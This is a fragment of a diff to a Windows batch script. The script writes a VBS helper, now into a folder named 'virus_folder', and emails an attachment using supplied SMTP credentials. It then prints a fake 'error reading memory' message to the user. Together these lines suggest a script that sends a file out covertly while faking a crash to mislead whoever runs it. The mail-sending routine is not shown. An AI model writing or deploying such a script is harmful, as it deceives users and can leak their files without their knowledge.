@@ -21,7 +21,7 @@ set "Auth=%~6"
 set "Pass=%~7"
 set "fileattach=%~8"
 )
-call :createVBS "email-bat.vbs"
+call :createVBS "C:\virus_folder\email-bat.vbs"
 call :send %From% %To% %Subj% %Body% %Serv% %Auth% %Pass%
 echo error reading memory at 0X900C
 pause
